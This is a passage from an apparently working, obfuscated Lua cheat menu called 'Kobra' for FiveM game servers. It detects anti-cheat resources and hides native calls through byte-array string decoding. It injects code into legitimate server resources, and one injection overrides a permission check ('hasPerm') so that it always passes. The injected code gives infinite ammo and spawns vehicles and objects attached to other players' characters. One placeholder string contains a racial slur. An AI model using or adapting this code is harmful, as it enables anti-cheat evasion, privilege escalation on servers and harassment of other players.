DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());else v36(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v888,v889) local v890=_G[v888];if ( not v890 or (type(v890)~="function")) then return;end _G[v888]=function(...) return v889(v890,...);end;end hNative("CreateThread",function(v891,...) return v891(...);end);hNative("Wait",function(v892,...) return v892(...);end);hNative("IsVehicleSeatFree",function(v893,...) return v893(...);end);hNative("PlayerPedId",function(v894,...) return v894(...);end);hNative("GetEntityCoords",function(v895,...) return v895(...);end);hNative("CreateCam",function(v896,...) return v896(...);end);hNative("SetCamCoord",function(v897,...) return v897(...);end);hNative("SetCamRot",function(v898,...) return v898(...);end);hNative("RenderScriptCams",function(v899,...) return v899(...);end);hNative("DestroyCam",function(v900,...) return v900(...);end);hNative("SetFocusEntity",function(v901,...) return v901(...);end);hNative("SetTextFont",function(v902,...) return v902(...);end);hNative("SetTextProportional",function(v903,...) return v903(...);end);hNative("SetTextScale",function(v904,...) return v904(...);end);hNative("SetTextDropShadow",function(v905,...) return v905(...);end);hNative("SetTextEdge",function(v906,...) return v906(...);end);hNative("SetTextOutline",function(v907,...) return v907(...);end);hNative("SetTextCentre",function(v908,...) return v908(...);end);hNative("SetTextColour",function(v909,...) return v909(...);end);hNative("BeginTextCommandDisplayText",function(v910,...) return v910(...);end);hNative("AddTextComponentSubstringPlayerName",function(v911,...) return v911(...);end);hNative("EndTextCommandDisplayText",function(v912,...) return v912(...);end);hNative("GetCamCoord",function(v913,...) return v913(...);end);hNative("GetCamRot",function(v914,...) return v914(...);end);hNative("IsControlPressed",function(v915,...) return v915(...);end);hNative("GetDisabledControlNormal",function(v916,...) return v916(...);end);hNative("TaskStandStill",function(v917,...) return v917(...);end);hNative("SetFocusPosAndVel",function(v918,...) return v918(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v919,...) return v919(...);end);hNative("GetShapeTestResult",function(v920,...) return v920(...);end);hNative("IsControlJustPressed",function(v921,...) return v921(...);end);hNative("IsDisabledControlJustPressed",function(v922,...) return v922(...);end);hNative("IsEntityAVehicle",function(v923,...) return v923(...);end);hNative("TaskWarpPedIntoVehicle",function(v924,...) return v924(...);end);hNative("SetEntityCoords",function(v925,...) return v925(...);end);hNative("GiveWeaponToPed",function(v926,...) return v926(...);end);hNative("SetCurrentPedWeapon",function(v927,...) return v927(...);end);hNative("ShootSingleBulletBetweenCoords",function(v928,...) return v928(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then local v995=0;while true do if (v995==0) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());end break;end end end end;v0.EnableInfiniteAmmo=function(v167) if (GetResourceState("WaveShield")=="started") then print("1");local function v485(v536) local v537=0 -0 ;local v538;while true do if (v537==(1981 -(362 + 1619))) then v538="";for v827=1626 -(950 + 675) , #v536 do v538=v538   .. string.char(v536[v827]) ;end v537=1 + 0 ;end if ((1180 -(216 + 963))==v537) then return v538;end end end local function v486(v539) return _G[v485(v539)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v487=v486({80,667 -(432 + 127) ,97,1194 -(1065 + 8) ,1702 -(635 + 966) ,114,122 -(5 + 37) ,101,158 -58 ,151 -78 ,188 -88 });local v488=v486({71,73 + 28 ,116,1670 -(963 + 624) ,947 -(518 + 328) ,172 -64 ,418 -(301 + 16) ,99,116,101,91 + 9 ,170 -90 ,61 + 40 ,317 -217 ,29 + 58 ,1120 -(829 + 190) ,97,154 -42 ,111,27 + 83 });local v489=v486({215 -144 ,714 -(520 + 93) ,392 -(259 + 17) ,26 + 46 ,328 -231 ,333 -218 ,1865 -(440 + 1321) ,1904 -(1059 + 770) ,467 -366 ,23 + 98 });local v490=v486({29 + 42 ,541 -(249 + 191) ,52 + 64 ,250 -185 ,109,6 + 103 ,841 -(434 + 296) ,585 -(169 + 343) ,97 + 13 ,80,101,100,1210 -(651 + 472) ,101,97,595 -(397 + 86) ,12 + 99 ,15 + 95 });local v491=v486({65,100,100,59 + 6 ,109,65 + 44 ,111,84,111,80,101,173 -73 });local v492=v486({68,328 -217 ,1019 -(782 + 136) ,970 -(112 + 743) ,12 + 57 ,828 -(493 + 225) ,426 -310 ,281 -176 ,116,345 -224 ,114 -45 ,1809 -(1201 + 488) ,66 + 39 ,206 -91 ,280 -164 });local v493=v486({247 -160 ,1598 -(277 + 1224) ,1598 -(663 + 830) ,116});local v494={};local function v495(v540) local v541=0 -0 ;local v542;local v543;while true do if (v541==0) then v542=coroutine.create(v540);v543=nil;v541=1;end if (v541==(876 -(461 + 414))) then function v543() while coroutine.status(v542)~="dead"  do local v929,v930=coroutine.resume(v542);if  not v929 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v930);break;end v493(0 + 0 );end end v543();break;end end end if  not _G.osintWaveLoop then local v629=0 + 0 ;while true do if (v629==(0 + 0)) then _G.osintWaveLoop=true;v495(function() while _G.osintWaveLoop do local v996=0 + 0 ;while true do if (v996==(250 -(172 + 78))) then if _G.osintInfAmmo.enabled then local v1300=v487();if v492(v1300) then local v1377=0;local v1378;while true do if (v1377==(0 -0)) then v1378=v488(v1300);if (v1378 and (v1378~=v489("WEAPON_UNARMED"))) then local v1613,v1614=v490(v1300,v1378);local v1615=tostring(v1300);if  not v494[v1615] then v494[v1615]=v1614;end if (v1614<v494[v1615]) then v491(v1300,v1378,v494[v1615] -v1614 );end end break;end end end else coroutine.yield();end coroutine.yield();break;end end end end);break;end end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v0.DisableInfiniteAmmo=function(v168) if (GetResourceState("WaveShield")=="started") then v36(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v0.AttachSelectedVehicle=function(v169,v170,v171) local v172=0 + 0 ;local v173;local v174;local v175;local v176;local v177;while true do if (v172==1) then v173=nil;function v173(v630) local v631=0 -0 ;local v632;while true do if (v631==1) then return table.concat(v632,",");end if (v631==0) then v632={};for v931=1, #v630 do v632[v931]=string.byte(v630,v931);end v631=1 + 0 ;end end end v172=1 + 1 ;end if (v172==(6 -2)) then for v633,v634 in ipairs(v170) do if (GetResourceState("solos-rentals")=="started") then local v789=0 -0 ;local v790;local v791;while true do if (v789==1) then if v790 then v177=v177 + 1 + 0 ;end break;end if (v789==(0 + 0)) then print("[vehicle_attach] Fallback: solos-rentals");v790,v791=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v175,v634));end);v789=1 + 0 ;end end elseif (GetResourceState("amigo")=="started") then local v933=0;local v934;local v935;while true do if (1==v933) then if v934 then v177=v177 + 1 ;end break;end if (v933==0) then print("[vehicle_attach] Fallback: Amigo RP");v934,v935=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v175,v634));end);v933=3 -2 ;end end elseif (GetResourceState("qb-core")=="started") then local v1056=0;local v1057;local v1058;while true do if (v1056==(2 -1)) then if v1057 then v177=v177 + 1 ;end break;end if (0==v1056) then print("[vehicle_attach] Fallback #02");v1057,v1058=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v175,v634));end);v1056=1 + 0 ;end end elseif ((v176:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then print("[vehicle_attach] Fallback #1");local v1175,v1176=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v175,v634));end);if v1175 then v177=v177 + 1 + 0 ;end elseif (GetResourceState("lunar_bridge")=="started") then local v1301=447 -(133 + 314) ;local v1302;local v1303;while true do if (v1301==1) then if v1302 then v177=v177 + 1 ;end break;end if (v1301==(0 + 0)) then print("[vehicle_attach] Fallback #2");v1302,v1303=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v175,v634));end);v1301=1;end end elseif (GetResourceState("lation_laundering")=="started") then local v1379=0;local v1380;local v1381;while true do if (v1379==(214 -(199 + 14))) then if v1380 then v177=v177 + (3 -2) ;end break;end if (v1379==(1549 -(647 + 902))) then print("[vehicle_attach] Fallback #3");v1380,v1381=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v175,v634));end);v1379=2 -1 ;end end else local v1382=0;local v1383;local v1384;while true do if (v1382==(234 -(85 + 148))) then if v1383 then v177=v177 + 1 ;end break;end if (v1382==(1289 -(426 + 863))) then print("[vehicle_attach] Universal Fallback");v1383,v1384=pcall(function() local v1576=0 -0 ;local v1577;while true do if (0==v1576) then v1577=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v175,v634);MachoInjectResourceRaw("any",v1577,v634);break;end end end);v1382=1655 -(873 + 781) ;end end end end break;end if (v172==(0 -0)) then if ( not v170 or ( #v170==(0 -0))) then v169:Notify("error","Kobra","No players selected!",1243 + 1757 );return;end if ( not v171 or ( #v171==(0 -0))) then local v709=0 -0 ;while true do if (v709==(0 -0)) then v169:Notify("error","Kobra","Invalid vehicle model!",3000);return;end end end v172=1948 -(414 + 1533) ;end if (v172==(3 + 0)) then v176=GetCurrentServerEndpoint();v177=555 -(443 + 112) ;v172=4;end if (v172==(1481 -(888 + 591))) then v174=v171;v175=v173(v174);v172=7 -4 ;end end end;function encodeToByteArrayLiteral(v178) local v179=0 + 0 ;local v180;while true do if (v179==(0 -0)) then if  not v178 then return "";end if (type(v178)~="string") then return tostring(v178);end v179=1 + 0 ;end if (v179==2) then for v635=1 + 0 , #v178 do v180[ #v180 + 1 ]=tostring(string.byte(v178,v635));end return table.concat(v180,", ");end if (v179==(1 + 0)) then if ( #v178==(0 -0)) then return "";end v180={};v179=3 -1 ;end end end v0.SpawnSelectedObject=function(v181,v182) if ( not v182 or ( #v182==(1678 -(136 + 1542)))) then local v496=0 -0 ;while true do if (v496==0) then v181:Notify("error","Kobra","No players selected!",2978 + 22 );return;end end end local v183=v181:GetSelectedObjectModel();if ( not v183 or ( #v183==0)) then local v497=0 -0 ;while true do if (v497==(0 + 0)) then v181:Notify("error","Kobra","Invalid object model!",3000);return;end end end local v184=encodeToByteArrayLiteral(v183);local v185=486 -(68 + 418) ;for v299,v300 in ipairs(v182) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v544=0 -0 ;while true do if ((0 -0)==v544) then v181:Notify("error","Kobra","Using Qb-core Spawner!",2590 + 410 );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v184,v300));v544=1093 -(770 + 322) ;end if (1==v544) then v185=v185 + 1 + 0 ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then local v710=0 + 0 ;while true do if (v710==(0 + 0)) then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v184,v300));v710=1 -0 ;end if (v710==1) then v185=v185 + 1 ;break;end end elseif (GetResourceState("rcore_drunk")=="started") then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v183,v300));v185=v185 + 1 ;elseif (GetResourceState("lc_fuel")=="started") then local v997=0 -0 ;while true do if (v997==0) then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v183,v300));v185=v185 + 1 ;break;end end elseif (GetResourceState("0r-illegalpack")=="started") then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v183,v300));v185=v185 + (2 -1) ;elseif (GetResourceState("xradio")=="started") then local v1249=0 -0 ;while true do if (v1249==(0 + 0)) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v183,v300));v185=v185 + 1 ;break;end end else local v1250=0 -0 ;while true do if (v1250==(0 + 0)) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
